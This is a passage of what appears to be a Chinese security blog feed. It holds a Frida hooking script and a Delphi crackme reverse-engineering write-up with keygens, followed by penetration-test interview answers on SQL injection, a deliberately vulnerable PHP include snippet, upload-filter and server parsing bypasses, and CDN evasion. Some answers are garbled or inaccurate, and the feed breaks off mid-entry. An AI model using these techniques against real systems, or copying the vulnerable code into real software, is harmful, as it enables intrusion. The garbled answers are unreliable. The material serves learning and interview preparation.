RuntimeException(&quot;invokeReflectConstruct error &quot; + className + &quot;   parameter   &quot; + parameter);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很简单，通过反射得到类的实例及方法，最终通过invoke代入参数执行方法。这里很幸运，我们发现这个EnhancedRobustUtils 是Robust自带的类，并不是动态加载的。<br>那hook就非常简单了，我们只需要简单的hook <code>invokeReflectMethod</code>获取Joseph的返回值，以及equals的参数即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105192047314.png" alt="image-20210105192047314"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">&#x2F;&#x2F;获得EnhancedRobustUtils类的wapper</span><br><span class="line">        var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">&#x2F;&#x2F;hook invokeReflectMethod方法</span><br><span class="line">        robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">        &#x2F;&#x2F;不破坏原来的逻辑，只在原来的逻辑中打印出Joseph，equals的值</span><br><span class="line">            var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">            if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">                console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">send(v4);</span><br><span class="line">console.log(&quot;return:&quot;+result);</span><br><span class="line">console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">send(v4);</span><br><span class="line">console.log(&quot;return:&quot;+result);</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行脚本 点击Onclick</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105200059163.png" alt="image-20210105200059163"></p><p>参考链接</p><p><a href="https://bbs.pediy.com/thread-229597.htm">https://bbs.pediy.com/thread-229597.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础环境&quot;&gt;&lt;a href=&quot;#基础环境&quot; class=&quot;headerlink&quot; title=&quot;基础环境&quot;&gt;&lt;/a&gt;基础环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme4</title>
    <link href="http://www.ol4three.com/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/"/>
    <id>http://www.ol4three.com/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/</id>
    <published>2021-01-04T15:02:15.000Z</published>
    <updated>2021-01-04T15:24:36.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先进行查壳"><a href="#首先进行查壳" class="headerlink" title="首先进行查壳"></a>首先进行查壳</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230306003.png" alt="image-20210104230306003" style="zoom:50%;"><p>可以看到程序使用的Delphi编写的 没有加壳</p><h2 id="导出符号"><a href="#导出符号" class="headerlink" title="导出符号"></a>导出符号</h2><p>既然是delphi编写的 那么我们首先把他放到IDA里，把所有的关于Delphi的签名全部加上</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230428344.png" alt="image-20210104230428344"></p><p>ida会自动帮我们识别所有的Delphi的函数，可以看到添加签名之后 未识别的函数就只有那么一点点，剩下的都是库函数。</p><p>然后导出为MAP文件，导入到OD里(LoadMapEx)，可以极大的减轻负担。</p><h2 id="窗体分析"><a href="#窗体分析" class="headerlink" title="窗体分析"></a>窗体分析</h2><p>两个编辑框 一个图片显示框，据说是注册之后会显示一个朱茵的图片。没有按钮，没有提示</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230656046.png" alt="image-20210104230656046" style="zoom:50%;"><p>利用Delphi的反编译工具Darkde4进行查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230805587.png" alt="image-20210104230805587"></p><p>打开窗体部分，原来之前一直误以为的图片显示框是一个大按钮，这个按钮有两个对应事件， 分别是单击事件和双击事件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230922854.png" alt="image-20210104230922854"></p><p>这里是整个程序的所有的响应事件 以及对应的RVA </p><blockquote><ul><li>第一个FormCreate是窗体的创建事件 这个不必关心，一般创建事件都是显示图形界面相关的操作 </li><li>第二个事件名是chkcode，全称应该是checkcode，校验代码，至于校验的是什么代码？不知道 </li><li>第三个KeyUp是响应的键盘的弹起 </li><li>第四个DbClick是按钮的双击事件 </li><li>第五个Click是按钮的单击事件 </li></ul></blockquote><p>那么思路和突破口也就有了，对应单击和双击事件的RVA 直接去OD分析两个响应事件的具体实现部分。</p><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>在单击事件的RVA 0x00457B8处下断点，随便输入一组用户名，从上往下分析所有的执行过程。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231029614.png" alt="image-20210104231029614"></p><ol><li><p>获取用户名</p></li><li><p>获取用户名长度 将长度加上0x1E </p></li><li><p>将长度转为字符串 </p></li><li><p>字符串拼接 拼接为长度+用户名+循环次数 </p></li><li><p>整个算法循环18次 最后的结果如上图</p></li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231109372.png" alt="image-20210104231109372"></p><p>算法循环完了之后 比较[esi+0x30C]的值是否相等，如果不相等直接退出。如果相等，又是一轮重复的循环校验，接着提示注册成功。就是说前面的循环算法就是作者下的一个套，真正有用的部分就是这个比较，也就是[esi+0x30C] 的值必须是0x85。</p><p><strong>结论</strong></p><blockquote><p>[esi+0x30C] 的值必须是0x85。</p></blockquote><p><strong>双击事件</strong></p><p>通过Delphi的反编译工具Darkde4的过程窗口找到双击事件的RVA。下断点，分析。注意，在这之前必须取消单击事件的断点，否则无法断下来。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231321825.png" alt="image-20210104231321825"></p><p>还是同样的套路，一轮循环的验证之后，才来到真正有用的部分。 [esi+0x30C]和0x3E作比较，如果成立，就把[esi+0x30C]赋值为0x85，也就满足了单击事件的条件。 也就是说必定有一个地方，是把[esi+0x30C]赋值为0x3E。如果满足了这个条件，那么双击事件校验通过，单击事件 也通过。</p><p><strong>结论</strong></p><blockquote><p>[esi+0x30C]的值必须为0x3E</p></blockquote><p><strong>再次寻找突破口</strong></p><p>根据双击事件经验 我们能猜测，肯定有一个地方是把0x3E赋值给了[esi+0x30C]。 那么我们直接在OD中，右键-&gt;查找所有常量，输入3E，看看能不能找到mov [esi+0x30C],0x3E这样一条指令。如果能，那么这个就是真正校验的地方。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231438376.png" alt="image-20210104231438376"></p><p>拉到函数最上面</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231501583.png" alt="image-20210104231501583"></p><p>之前导入的IDA的注释显示这个是chkcode的校验事件。就是之前我们在Darkde4过程窗口里看到的checkcode的响应事件，这个应该就是真正的校验函数了。下断点，开始分析</p><p><strong>chcode事件</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231540286.png" alt="image-20210104231540286"></p><p>首先获取用户名长度 然后将用户名长度+5，接着进行字符串拼接 拼接方式为黑头Sun Bird(用户名长度+5)dseloffc012-OK(用户名)，拼接好的字符串就是密码。</p><p><strong>结果</strong></p><p>接着输入用户名和序列号，根据之前的分析过程 我们需要先双击，再单击才能够校验成功</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231617223.png" alt="image-20210104231617223"></p><p>但是这里需要注意一点，在过程窗口中有一个KeyUp键盘弹起事件，在你输入序列号的时候 他会检测是否有键盘弹起，如果没有则不成功，这样做的目的是为了防止复制粘贴。破解的方法也很简单，在复制粘贴完序列号之后随便 按一个键(比如方向键 这样不会影响到输入结果)，接着双击再单击。可以看到，成功注册完成。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231703531.png" alt="image-20210104231703531" style="zoom:50%;"><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><blockquote><p>C</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot; </span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    char key1[50] &#x3D; &quot;黑头Sun Bird&quot;; </span><br><span class="line">    char key2[50] &#x3D; &quot;dseloffc-012-OK&quot;; </span><br><span class="line">    char username[20] &#x3D; &#123; 0 &#125;; </span><br><span class="line">    printf(&quot;请输入用户名:&quot;); </span><br><span class="line">    scanf_s(&quot;%s&quot;, username, 20); </span><br><span class="line">    printf(&quot;序列号为:\n&quot;); </span><br><span class="line">    printf(&quot;%s%d%s%s\n&quot;, key1, strlen(username)+5, key2, username); </span><br><span class="line">    system(&quot;pause&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Python</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;please input username&quot;)</span><br><span class="line">s &#x3D; raw_input()</span><br><span class="line">print(&quot;黑头Sun Bird&quot; + str(len(s)+5) + &quot;dseloffc-012-OK&quot; + s)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231832620.png" alt="image-20210104231832620"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先进行查壳&quot;&gt;&lt;a href=&quot;#首先进行查壳&quot; class=&quot;headerlink&quot; title=&quot;首先进行查壳&quot;&gt;&lt;/a&gt;首先进行查壳&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>2020 最新渗透测试⾯试题合集</title>
    <link href="http://www.ol4three.com/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/"/>
    <id>http://www.ol4three.com/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/</id>
    <published>2020-12-30T01:55:25.000Z</published>
    <updated>2020-12-30T02:22:54.214Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。</p></blockquote><h2 id="渗透篇"><a href="#渗透篇" class="headerlink" title="渗透篇"></a>渗透篇</h2><h4 id="1、介绍⼀下⾃认为有趣的挖洞经历"><a href="#1、介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="1、介绍⼀下⾃认为有趣的挖洞经历"></a>1、介绍⼀下⾃认为有趣的挖洞经历</h4><p>挖洞也有分很多种类型，⼀种是以渗透、⼀种是以找漏洞为主，如果是前者会想各种办法获取权限继⽽获取想要的的东 </p><p>⻄完成渗透⽬标，这类跟 HW 类似，⽬标各种漏洞不算，要有 Shell，服务器权限才给分，这才是最接近实战渗透，跟某 </p><p>部⻔有合作的话也是属于这种打击⽹络犯罪获得权限、传销数据、组织架构，服务器权限、等……</p><h4 id="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h4><p>SQL 注⼊、密码组合, 前者防护分为⼏种，CDN -&gt; Web -&gt; 数据库 -&gt; 主机, 设置最⼩权限来应对。密码组合根据个⼈ </p><p>习惯</p><h4 id="3、php-java-反序列化漏洞的原理-解决⽅案"><a href="#3、php-java-反序列化漏洞的原理-解决⽅案" class="headerlink" title="3、php/java 反序列化漏洞的原理? 解决⽅案?"></a>3、php/java 反序列化漏洞的原理? 解决⽅案?</h4><p>php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把⼀个对象变成可以传输的字符串, 如果服务器能够接 </p><p>收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术⽅法⾥⾯的话，就容易造成很严重的漏洞 </p><p>了。</p><p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;} </p><p>这⾥的 O 代表存储的是对象（object）, 假如你给 serialize() 传⼊的是⼀个数组，那它会变成字⺟ a。7 表示对象的名称 </p><p>有 7 个字符。”chybeta” 表示对象的名称。1 表示有⼀个值。{s:4:”test”;s:3:”123”;} 中，s 表示字符串，4 表示该字符串的 </p><p>⻓度，”test” 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传⼊⼀个精⼼构造的序列 </p><p>化字符串 控 对象内部的变 甚 数化字符串，从⽽控制对象内部的变量甚⾄是函数。 </p><p>JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、⽂件、数据库中，ObjectOutputStream 类 </p><p>的 writeObject() ⽅法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类 </p><p>的 readObject() ⽅法⽤于反序列化。 </p><h4 id="4、如果⼀台服务器被⼊侵后-你会如何做应急响应"><a href="#4、如果⼀台服务器被⼊侵后-你会如何做应急响应" class="headerlink" title="4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?"></a>4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?</h4><ol><li><p>准备相关的⼯具，查后⻔等⼯具 </p></li><li><p>初步判断事件类型, 事件等级。 </p></li><li><p>抑制范围，隔离使受害⾯不继续扩⼤ </p></li><li><p>查找原因，封堵攻击源。 </p></li><li><p>业务恢复正常⽔平. </p></li><li><p>总结，报告，并修复、监控 </p></li></ol><p>以上是常规的回答，想知道你是否有这⽅⾯应急相关的经验，像这类问题甲⽅⾯试⽐较多。 </p><h4 id="5、你平时使⽤哪些⼯具-以及对应⼯具的特点"><a href="#5、你平时使⽤哪些⼯具-以及对应⼯具的特点" class="headerlink" title="5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?"></a>5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?</h4><p>AWVS、Masscan、BurpSuite </p><p>AWVS 常规漏洞扫描，masscan 快速查找端⼝，burp 重复提交数据包 </p><p>想知道是否有⾃⼰开发⼯具，如果没有你对每个安全⼯具有哪些独特的⻅解以及别⼈不知道的技巧⽤法。如：awvs 如何 </p><p>批量扫描？burpsuite 如何爆破 401､脱库等、等等… </p><h4 id="6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，"><a href="#6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，" class="headerlink" title="6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，"></a>6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，</h4><p>上传漏洞选⼀)PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DATA， </p><p>是⼀个项⽬管理系统</p><h4 id="7、如何判断-sql-注⼊，有哪些⽅法"><a href="#7、如何判断-sql-注⼊，有哪些⽅法" class="headerlink" title="7、如何判断 sql 注⼊，有哪些⽅法"></a>7、如何判断 sql 注⼊，有哪些⽅法</h4><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，除此之外通过 DNSlog 判断 </p><p>是还有传回值 </p><h4 id="8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"><a href="#8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？" class="headerlink" title="8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"></a>8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？</h4><p>select * from news where id = ‘$SQL’; </p><p>当程序执⾏访问新闻等⼀些操作都会执⾏到 sql 语句进⾏调⽤，如果在此调⽤过程中，提交了不合法的数据，⽽数据库 </p><p>⽆法识别则会报错。也就是⼀切输⼊都是有害的。 </p><p>注⼊类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠 </p><p>注⼊提交⽅式：GET、POST、Cookies、⽂件头 </p><p>利⽤⽅式：具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限⼤也可以执⾏命令但是 </p><p>条件是在 lINUX 环境下。 </p><p>防范: 边界, CDN -&gt; 脚本语⾔过滤 -&gt; 数据库过滤最⼩权限 -&gt; 主机 </p><h4 id="9、为什么有的时候没有错误回显"><a href="#9、为什么有的时候没有错误回显" class="headerlink" title="9、为什么有的时候没有错误回显"></a>9、为什么有的时候没有错误回显</h4><p>没有进⾏错误打印或者错误屏蔽 </p><h4 id="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？"><a href="#10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？" class="headerlink" title="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？"></a>10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？</h4><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉 </p><p>字，所以 %df 时候会和转义符 \ %5c 进⾏结合, 所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。</p><h4 id="11、CRLF-注⼊的原理"><a href="#11、CRLF-注⼊的原理" class="headerlink" title="11、CRLF 注⼊的原理"></a>11、CRLF 注⼊的原理</h4><p>CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（\r\n）的简称, 在 HTTP </p><p>协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显 </p><p>示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏ </p><h4 id="12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？"><a href="#12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？" class="headerlink" title="12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？"></a>12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</h4><p>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p><p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。 </p><h4 id="13、php-ini-可以设置哪些安全特性"><a href="#13、php-ini-可以设置哪些安全特性" class="headerlink" title="13、php.ini 可以设置哪些安全特性"></a>13、php.ini 可以设置哪些安全特性</h4><p>禁⽤ PHP 函数 </p><p>允许 include 或打开访问远程资源 </p><h4 id="14、php-的-00-截断的原理是什么？"><a href="#14、php-的-00-截断的原理是什么？" class="headerlink" title="14、php 的 %00 截断的原理是什么？"></a>14、php 的 %00 截断的原理是什么？</h4><p>因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 </p><p>%00 是结束符号不会继续往后执⾏ </p><p>条件：PHP&lt;5.3.29，且 GPC 关闭 </p><h4 id="15、webshell-检测，有哪些⽅法"><a href="#15、webshell-检测，有哪些⽅法" class="headerlink" title="15、webshell 检测，有哪些⽅法"></a>15、webshell 检测，有哪些⽅法</h4><p>grep、关键词、关键函数 </p><p>安全狗、D 盾</p><p>的 本地包含 洞 什么 段带有 洞的代 ⼿ 的话如何发掘 如 报错 你 怎么16、php 的 LFI，本地包含漏洞原理是什么？写⼀段带有漏洞的代码。⼿⼯的话如何发掘？如果⽆报错回显，你是怎么 </p><p>遍历⽂件的？ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&#39;fifile&#39;])&#123; </span><br><span class="line"></span><br><span class="line">include $_GET[&#39;fifile&#39;]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包含的⽂件设置为变量，并且⽆过滤导致可以调⽤恶意⽂件 还可以对远程⽂件包含，但需要开启 allow_url_include = </p><p>ON 通过测试参数的地⽅进⾏本地⽂件 / etc/passwd 等包含 如何存在漏洞⽽且没有回显，有可能没有显示在⻚⾯⽽是 </p><p>在⽹⻚源代码中，除了些可以利⽤ DNSlog 进⾏获取包含的信息。从 index.php ⽂件⼀级级往读取 也可以利⽤ PHP 封 </p><p>装协议读取⽂件 </p><h4 id="17、说说常⻅的中间件解析漏洞利⽤⽅式"><a href="#17、说说常⻅的中间件解析漏洞利⽤⽅式" class="headerlink" title="17、说说常⻅的中间件解析漏洞利⽤⽅式"></a>17、说说常⻅的中间件解析漏洞利⽤⽅式</h4><p>IIS 6.0</p><p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p><p>IIS 7.0/7.5 </p><p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p><p>Nginx </p><p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 </p><p>空字节代码 xxx.jpg%00.php </p><p>Apache </p><p>上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p><p>的 户名密 存放在 张表 密 采 种加密⽅式18、mysql 的⽤户名密码是存放在那张表⾥⾯？mysql 密码采⽤哪种加密⽅式？ </p><p>mysql -&gt; users </p><p>SHA1 </p><h4 id="19、Windows、Linux、数据库的加固降权思路，任选其⼀"><a href="#19、Windows、Linux、数据库的加固降权思路，任选其⼀" class="headerlink" title="19、Windows、Linux、数据库的加固降权思路，任选其⼀"></a>19、Windows、Linux、数据库的加固降权思路，任选其⼀</h4><p>禁⽤ root </p><p>禁⽌远程访问 </p><p>禁⽌写⼊</p><p>单独帐号 </p><p>禁⽌执⾏ system 等函数 </p><h4 id="20、你使⽤什么⼯具来判断系统是否存在后⻔"><a href="#20、你使⽤什么⼯具来判断系统是否存在后⻔" class="headerlink" title="20、你使⽤什么⼯具来判断系统是否存在后⻔"></a>20、你使⽤什么⼯具来判断系统是否存在后⻔</h4><p>Chkrootkit </p><p>Rkhunter </p><h4 id="21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？"><a href="#21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？" class="headerlink" title="21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？"></a>21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？</h4><p>类似 phpinfo、⽹站信息 </p><p>C 段、⼦域名</p><p>历史解析记录 </p><p>DDOSzmap 全⽹扫描识别 http 头 </p><p>⽹站域名管理员邮箱，注册过的域名等相关信息关联 </p><h4 id="22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。"><a 